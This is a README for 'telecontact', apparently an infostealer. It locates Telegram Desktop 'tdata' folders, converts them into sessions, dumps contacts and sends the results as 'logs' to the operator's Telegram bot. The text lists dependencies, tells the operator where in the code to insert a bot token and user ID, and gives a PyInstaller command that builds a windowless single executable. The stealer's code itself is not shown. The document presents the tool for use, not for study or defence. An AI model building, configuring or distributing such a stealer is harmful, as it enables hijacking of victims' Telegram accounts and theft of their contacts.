# telecontact
## (probably?) smart search for tdata, converts them to session and dumps contacts
-------------
# how du ran ser??
## requirements
```
telethon
git+http://github.com/serveroid/opentele (original is broken)
requests
```
## editing the thing
### edit line 104 with ur bot token, line 108 and 113 with your user id (YOU MUST RUN START IN THE BOT TO RECEIVE LOGS)

# building
``
pyinstaller --onefile --noconsole --hidden-import=opentele --hidden-import=opentele.td --hidden-import=opentele.tl --hidden-import=opentele.api --hidden-import=telethon --hidden-import=telethon.tl.functions --hidden-import=telethon.tl.types --hidden-import=requests bot.py
``
